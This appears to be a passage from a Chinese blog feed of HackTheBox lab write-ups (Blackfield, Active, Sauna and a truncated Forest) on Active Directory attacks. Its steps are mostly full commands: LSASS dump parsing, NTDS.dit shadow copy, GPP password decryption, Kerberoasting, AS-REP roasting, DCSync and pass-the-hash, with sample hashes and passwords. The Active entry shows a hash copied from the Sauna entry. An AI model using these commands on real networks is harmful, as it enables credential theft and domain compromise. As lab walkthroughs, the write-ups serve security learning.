Control</code>可以发现<code>support</code>用户与<code>audit2020</code>用户有<code>ForceChangePassword</code>关系</p><p>顾名思义，就是<code>support</code>用户可以修改<code>audit2020</code>用户的密码</p><h2 id="ForceChangePassword权限滥用实现横向移动"><a href="#ForceChangePassword权限滥用实现横向移动" class="headerlink" title="ForceChangePassword权限滥用实现横向移动"></a>ForceChangePassword权限滥用实现横向移动</h2><p>尝试利用<code>rpcclient</code>修改<code>audit2020</code>用户的密码</p><p><code>rpcclient -U support --password=&#39;#00^BlackKnight&#39; //10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710153321856-686397598.png" alt="image-20240710153321021"></p><p>修改密码</p><p><code>setuserinfo2 audit2020 23 &#39;test&#39;</code> </p><p>其中<code>23</code>表示用户信息级别为设置用户密码的级别</p><p>当设置的新密码与密码策略不匹配时会返回，设置一个复杂度比较高的密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154020510-5395533.png" alt="image-20240710154019443"></p><p><code>setuserinfo2 audit2020 23 &#39;abc123!&#39;</code> </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154643225-1445876917.png" alt="image-20240710154642384"></p><p>利用<code>crackmapexec</code>验证一下</p><p><code>crackmapexec smb 10.10.10.192 -u audit2020 -p &#39;abc123!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154816714-1157833350.png" alt="image-20240710154815763"></p><p>尝试通过<code>audit2020</code>用户去获得更多<code>smb</code>共享目录</p><p><code>smbmap -H 10.10.10.192 -u audit2020 -p &#39;abc123!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710155251724-1886584129.png" alt="image-20240710155250411"></p><p>发现获得了<code>forensic</code>目录的访问权限</p><p><code>smbclient -U audit2020%&#39;abc123!&#39; //10.10.10.192/forensic</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710170746090-1201307298.png" alt="image-20240710170745364"></p><p>在<code>\commands_output\</code>目录下找到<code>domain_admins.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710170914171-1511595285.png" alt="image-20240710170913100"></p><p>将其<code>get</code>下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710171000940-1172109387.png" alt="image-20240710171000020"></p><p>发现疑似<code>admin</code>密码</p><h2 id="利用Lsass内存捕获文件提取用户hash"><a href="#利用Lsass内存捕获文件提取用户hash" class="headerlink" title="利用Lsass内存捕获文件提取用户hash"></a>利用Lsass内存捕获文件提取用户hash</h2><p>在<code>\memory_analysis\</code>目录下发现 <code>lsass.zip</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710192250343-879219788.png" alt="image-20240710192247820"></p><p>该文件可能是对<code>LSASS</code>进程进行了内存捕获的结果，<code>LSASS</code>是<code>Windows</code>中处理身份验证和安全策略的系统服务。其内存空间中保存着各种身份验证的信息。我们将该文件下载并解压。</p><p><code>smbclient -U audit2020%&#39;abc123!&#39; //10.10.10.192/forensic -t 1000</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710203532417-712881982.png" alt="image-20240710203530888"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711113908563-1043657612.png" alt="image-20240711113903638"></p><p>得到一个<code>lsass.DMP</code>文件</p><p>使用<code>mimikatz</code>工具从内存转储中尝试提取用户的<code>hash</code>，在<code>Linux</code>中使用<code>Python</code>版的<code>Mimikatz</code>——<code>pypykatz</code></p><p><code>pypykatz lsa minidump lsass.DMP</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711140819814-250042491.png" alt="image-20240711140816038"></p><p>找到<code>svc_backup</code>用户的<code>hash</code>：<code>9658d1d1dcd9250115e2205d9f48400d</code></p><p>先尝试利用<code>svc_backup</code>用户名及其<code>hash</code>远程登录</p><p><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711143617732-359613996.png" alt="image-20240711143614075"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711150000424-813557009.png" alt="image-20240711145956639"></p><h2 id="利用SeBackupPrivilege权限进行NTDS-dit卷影拷贝实现权限提升"><a href="#利用SeBackupPrivilege权限进行NTDS-dit卷影拷贝实现权限提升" class="headerlink" title="利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升"></a>利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711164410787-733913997.png" alt="image-20240711164407072"></p><p>在之前的<code>bloodhound</code>信息搜集中搜索<code>svc_backup</code>，点击<code>First Degree Group Memberships</code>发现该用户属于<code>backup_operators</code>组的成员</p><p>拥有这个组权限的人可以通过<code>SEBackupPrivilege</code>权限进行提权，执行如下命令，确认是否具有该权限：</p><p><code>whoami /priv</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711170127115-1738419937.png" alt="image-20240711170123369"></p><p>发现我们有<code>SeBackupPrivilege</code>权限，就可以通过使用签名的二进制文件创建 <code>NTDS.dit</code> 的卷影副本来完成<code>diskshadow</code></p><p>首先上传并导入<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/Blackfield/SeBackupPrivilegeCmdLets.dll </span><br><span class="line"></span><br><span class="line">upload /root/htb/Machines/Blackfield/SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line"></span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711202225639-2048106759.png" alt="image-20240711202221083"></p><p>接着写入文件并通过<code>upload</code>上传</p><p><a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">参考链接</a></p><p>但是这里要加一行来指定元数据文件的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters#</span><br><span class="line">add volume c: alias new1#</span><br><span class="line">set metadata c:\windows\system32\spool\drivers\color\example.cab # 添加的部分</span><br><span class="line">create#</span><br><span class="line">expose %new1% z:#</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711202619203-1966588599.png" alt="image-20240711202615153"></p><p>执行<code>diskshadow</code>并使用脚本文件作为其输入</p><p><code>cmd /c diskshadow /s cmd.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711203325908-369933739.png" alt="image-20240711203321708"></p><p>将备份<code>ntds.dit</code>文件移动到当前文件夹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robocopy /b z:\windows\ntds\ .\ NTDS.dit</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711204452433-847416599.png" alt="image-20240711204448694"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711204526369-88572884.png" alt="image-20240711204522630"></p><p>从注册表中获取<code>system.hive</code>文件</p><p><code>reg save HKLM\SYSTEM .\system.hive</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711205054759-313412363.png" alt="image-20240711205050633"></p><p>可以看到，现在已经获得了<code>NTDS.dit</code>和<code>system.hive</code>，将这两个文件下载到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download ntds.dit</span><br><span class="line">download system.hive</span><br></pre></td></tr></table></figure><p>使用<code>secretsdump.py</code> 解析 <code>NTDS.dit</code></p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive local</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712141900243-2116055538.png" alt="image-20240712141859105"></p><p>拿到<code>administrator</code>的<code>hash</code></p><h2 id="使用wmiexec进行PTH"><a href="#使用wmiexec进行PTH" class="headerlink" title="使用wmiexec进行PTH"></a>使用wmiexec进行PTH</h2><p>通过<code>wmiexec.py</code>通过<code>hash</code>来登录到管理员账户</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee blackfield.LOCAL/administrator@10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712142129871-935519493.png" alt="image-20240712142125899"></p><p>现在已经是管理员权限了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712142629505-762298768.png" alt="image-20240712142625352"></p><p>最后在<code>Administrator</code>的<code>Desktop</code>上找到<code>root.txt</code>以及<code>notes.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Active</title>
      <link href="/posts/79fbfa03.html"/>
      <url>/posts/79fbfa03.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.100</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>组策略安全问题</li><li>Kerberoasting攻击</li><li>smbclient工具使用</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708130024551-1884352902.png" alt="image-20240708130022178"></p><p>发现有<code>kerberos</code>服务，<code>smb</code>服务，<code>ldap</code>服务，域名为 <code>active.htb</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -L \\10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708131335828-1229634342.png" alt="image-20240708131333628"></p><p>发现匿名登陆成功，并得到一些可以访问的共享资源，进一步探测</p><p><code>smbmap -H 10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708134451917-1771966004.png" alt="image-20240708134449415"></p><p>可以看到匿名用户对 <code>Replication</code> 文件夹具有 <code>READ ONLY</code> 权限，尝试访问</p><p><code>smbclient //10.10.10.100/Replication</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708135139603-190151919.png" alt="image-20240708135137253"></p><h1 id="组策略GPP密码解密"><a href="#组策略GPP密码解密" class="headerlink" title="组策略GPP密码解密"></a>组策略GPP密码解密</h1><blockquote><p>当创建新的组策略首选项（GPP）时，在 C:\Windows\SYSVOL 中会创建一个与相关配置数据相关联的XML文件，其中包括与 GPP 关联的任何密码。为了安全起见，Microsoft AES 在将密码存储为 cpassword 但随后微软在 MSDN 上发布了密钥。<br>由于经过身份验证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的读取权限，所以域中的任何人都可以搜索包含“cpassword”的XML文件的SYSVOL共享，该文件是包含AES加密密码的值。</p><p>所有域组策略都存储在：\ SYSVOL \ Policies \</p></blockquote><p>使用<code>smbclient</code>尝试访问该目录的文件，最后在<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>目录下发现<code>Groups.xml</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708141318506-1037427827.png" alt="image-20240708141316123"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708141329701-245755982.png" alt="image-20240708141327727"></p><p>可以拿到一对用户名和<code>GPP</code>密码</p><p><code>active.htb\SVC_TGS : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p><p>由于密钥是已知的，我们可以使用<code>Kali</code>上的工具<code>gpp-decrypt</code>来解密</p><p><code>gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708142501970-1727130224.png" alt="image-20240708142457314"></p><blockquote><p>active.htb\SVC_TGS</p><p>GPPstillStandingStrong2k18</p></blockquote><p>现在我们拿到了一个域用户的账号和明文密码，接下来我们再来尝试通过<code>SMB</code>登录</p><p><code>smbclient //10.10.10.100/Users -U SVC_TGS</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144846574-1126980413.png" alt="image-20240708144844053"></p><p>最后在<code>SVC_TGS</code>用户的<code>Desktop</code>得到<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144937195-1629946426.png" alt="image-20240708144935287"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144943344-1994666938.png" alt="image-20240708144941529"></p><h1 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h1><blockquote><p>攻击原理：</p><p>​            <code>Kerberoasting</code> 是流行的 <code>AD Kerberos</code> 攻击之一，Kerberoasting 是一种允许攻击者窃取使用 RC4 加密的 <code>KRB_TGS</code> 票证的技术，以暴力破解应用程序服务哈希以提取其密码。  在此攻击中，从<code>Active Directory</code>中提取服务帐户的凭据哈希并离线破解。我们需要确定哪些帐户是<code>kerberoastable</code>，然后作为经过身份验证的用户，我们可以为目标服务帐户请求服务票证  (TGS)，而无需向运行服务的目标服务器发送任何流量。</p></blockquote><p>如下图所示，<code>kerberoasting</code> 的重点是向 <code>KDC</code> 请求 <code>TGS</code>。此攻击仅涉及突出显示的步骤 3 和 4。</p><p><img src="https://rootdse.org/assets/images/0006-active-directory-security-2/kerberoasting_flow.png" alt="Kerberos Authentication flow)"></p><p>可以使用<code>Impacket</code> 中的脚本<code>GetUserSPNs.py</code>来获取与<code>SVC_TGS</code>用户帐户相关联的服务的用户名列表</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708151704422-1431746945.png" alt="image-20240708151701799"></p><p>这样就拿到了一张管理员服务票据（TGS）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7</span><br></pre></td></tr></table></figure><p>使用<code>john</code>破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708153350228-1991754535.png" alt="image-20240708153348021"></p><p><code>Ticketmaster1968</code></p><p>通过<code>smbclient</code>登录<code>administrator</code></p><p><code>smbclient -U administrator //10.10.10.100/Users</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090439214-1141233570.png" alt="image-20240709090438584"></p><p>最后在<code>Desktop</code>目录拿到<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090433888-136269028.png" alt="image-20240709090433121"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090426341-1460306309.png" alt="image-20240709090425370"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Sauna</title>
      <link href="/posts/5551a214.html"/>
      <url>/posts/5551a214.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.175</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>AS-REP Roasting</li><li>DCSync提权</li><li>PTH传递攻击</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap扫一下</p><p><code>nmap -sS -sV -sC 10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705135044409-1259975882.png" alt="image-20240705135030653"></p><p>发现有<code>web</code>服务，<code>DNS</code>服务，<code>Kerberos</code>服务，<code>smb</code>共享服务，<code>RPC</code>服务，<code>LDAP</code>服务，有AD域</p><p>得到一个域名<code>EGOTISTICAL-BANK.LOCAL</code></p><p>先简单测试一下</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>尝试匿名登录SMB服务</p><p><code>smbclient -N -L \\10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705140443576-595990783.png" alt="image-20240705140430156"></p><p>匿名登陆成功，但是并无重要信息</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>尝试使用ldapsearch工具尝试获取域中的用户，根据之前得到的域名<code>EGOTISTICAL-BANK.LOCAL</code>构造如下命令</p><p><code>ldapsearch -x -H ldap://10.10.10.175  -b &quot;dc=Egotistical-bank,dc=local&quot; | grep &quot;dn:&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141252587-707688598.png" alt="image-20240705141239128"></p><p>获取到一个可能叫做<code>Hugo Smith</code>的用户</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>尝试<code>RPC</code>空账号登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141727490-1030070414.png" alt="image-20240705141714174"></p><p><code>RPC</code>拒绝连接</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>在页面中，找到如下姓名</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141529895-1920992009.png" alt="image-20240705141516397"></p><blockquote><p>Fergus Smith </p><p>Shaun Coins </p><p>Hugo Bear </p><p>Steven Kerb </p><p>Bowie Taylor </p><p>Sophie Driver</p></blockquote><h2 id="kerbrute用户名枚举"><a href="#kerbrute用户名枚举" class="headerlink" title="kerbrute用户名枚举"></a>kerbrute用户名枚举</h2><p>尝试通过<code>kerbrute</code>列出使用者，字典使用的是<code>seclists</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705154300732-2114639653.png" alt="image-20240705154247314"></p><p>可以看到有<code>hsmith</code>和<code>fsmith</code>用户</p><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>将两个用户名保存到<code>user.txt</code>，尝试一下<code>AS-REP Roasting</code>攻击</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt  -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705165616305-146200250.png" alt="image-20240705165602974"></p><p>拿到<code>fsmith</code>用户的<code>hash</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7</span><br></pre></td></tr></table></figure><p>使用<code>john</code>破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705170725588-1732545966.png" alt="image-20240705170711853"></p><p>拿到<code>fsmith</code>的凭证<code>fsmith:Thestrokes23</code></p><p>尝试远程登陆</p><p><code>evil-winrm -i 10.10.10.175 -u &#39;fsmith&#39; -p &#39;Thestrokes23&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705171004310-183933394.png" alt="image-20240705170949902"></p><p>登录成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705171705037-1061082570.png" alt="image-20240705171651372"></p><p>最后在桌面上拿到<code>user.txt</code></p><h1 id="注册表获取用户密码"><a href="#注册表获取用户密码" class="headerlink" title="注册表获取用户密码"></a>注册表获取用户密码</h1><p>在<code>Users</code>目录下发现新用户<code>svc_loanmgr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706125236729-1214413985.png" alt="image-20240706125235716"></p><p>通过查询<code>Winlogon</code>注册表来手动收集信息</p><p><code>reg.exe query &quot;HKLM\software\microsoft\windows nt\currentversion\winlogon&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706130913738-871033410.png" alt="image-20240706130910599"></p><p>拿到用户名密码<code>svc_loanmanager : Moneymakestheworldgoround!</code></p><p>但是通过登录发现<code>svc_loanmanager</code>登不上，登录<code>svc_loanmgr</code>登陆成功</p><h1 id="AD域渗透权限提升"><a href="#AD域渗透权限提升" class="headerlink" title="AD域渗透权限提升"></a>AD域渗透权限提升</h1><h2 id="BloodHound信息搜集"><a href="#BloodHound信息搜集" class="headerlink" title="BloodHound信息搜集"></a>BloodHound信息搜集</h2><p>登录<code>svc_loanmgr</code>用户</p><p><code>evil-winrm -i 10.10.10.175 -u &#39;svc_loanmgr&#39; -p &#39;Moneymakestheworldgoround!&#39;</code></p><p>接下来使用<code>bloodhound</code>进行信息搜集</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/Sauna/SharpHound.exe</span><br><span class="line">./SharpHound.exe</span><br><span class="line">download 20240706064043_BloodHound.zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706151303740-1966923458.png" alt="image-20240706151302995"></p><p>分析发现可以利用<code>DCSync</code>攻击直接域控</p><h2 id="DCSync提权"><a href="#DCSync提权" class="headerlink" title="DCSync提权"></a>DCSync提权</h2><p>使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc_loanmgr:&#39;Moneymakestheworldgoround!&#39;@10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706151914385-627492788.png" alt="image-20240706151913724"></p><p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p><h2 id="PTH传递攻击获取Root"><a href="#PTH传递攻击获取Root" class="headerlink" title="PTH传递攻击获取Root"></a>PTH传递攻击获取Root</h2><p>拿到了管理员的<code>hash</code>，就可以通过<code>wmiexec</code>哈希传递拿到管理员用户的权限</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706152200125-1504201946.png" alt="image-20240706152159481"></p><p>成功拿到管理员用户的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706152456281-1524121811.png" alt="image-20240706152455683"></p><p>最后在<code>desktop</code>获取<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Forest</title>
      <link href="/posts/1bc19c16.html"/>
      <url>/posts/1bc19c16.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.161</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>AD域渗透提取</li><li>AS-REP Roasting攻击</li><li>Hash爆破</li><li>PTH传递攻击</li><li>滥用DCSync</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>拿namp扫一下 </p><p><code>nmap -sS -sV -sC 10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702183037029-68856069.png" alt="image-20240702183019354"></p><p>发现存在系统<code>Windows Server 2016</code>，有<code>DNS</code>服务，<code>Kerberos</code>服务，<code>smb</code>共享服务，<code>RPC</code>服务，无web页面，只有AD域</p><p>先将域名加到配置文件中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.161  htb.local&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.161  forest.htb.local&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><blockquote><p>Domain: htb.local</p><p>workgroup: HTB</p></blockquote><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>尝试匿名登录SMB服务</p><p><code>smbclient -L \\10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702183130828-1497766679.png" alt="image-20240702183114049"></p><p>也是没有什么重要信息</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>尝试使用ldapsearch工具尝试获取域中的用户列表，根据之前得到的域名<code>htb.local</code>构造如下命令：</p><p><code>ldapsearch -H ldap://10.10.10.161:389 -x -b &quot;CN=users,DC=htb,DC=local&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702192629104-1904357355.png" alt="image-20240702192626662"></p><p>也没什么重要的信息</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>利用RPC远程过程调用枚举用户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿DESKTOP-K196DPF)-[~/MyFile]</span><br><span class="line">└─<span class="comment"># rpcclient -U &quot;&quot; -N 10.10.10.161</span></span><br><span class="line">rpcclient $&gt; 